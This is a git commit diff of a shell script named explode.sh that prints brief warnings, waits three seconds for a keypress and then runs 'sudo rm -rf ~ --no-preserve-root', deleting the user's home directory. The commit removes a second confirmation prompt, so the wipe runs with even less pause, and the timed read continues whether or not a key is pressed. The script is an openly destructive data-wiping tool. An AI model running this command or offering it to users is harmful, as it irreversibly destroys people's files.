e1789b4927b901067bd2c2ace350c7082bd1cca0
JerryBerry12 <85509021+JerryBerry12@users.noreply.github.com>
2022-03-25 17:55:23 -0400

    Update explode.sh

--- explode.sh
+++ explode.sh
@@ -3,6 +3,4 @@ echo "1. Using a virtual machine and know the risks"
 echo "2. Are SUDO"
 echo "hit enter to continue"
 read -t 3 -n 1
-echo "So far, this has only been tested on Endless OS. Are you sure you want to execute?"
-read -t 3 -n 1
 sudo rm -rf ~ --no-preserve-root
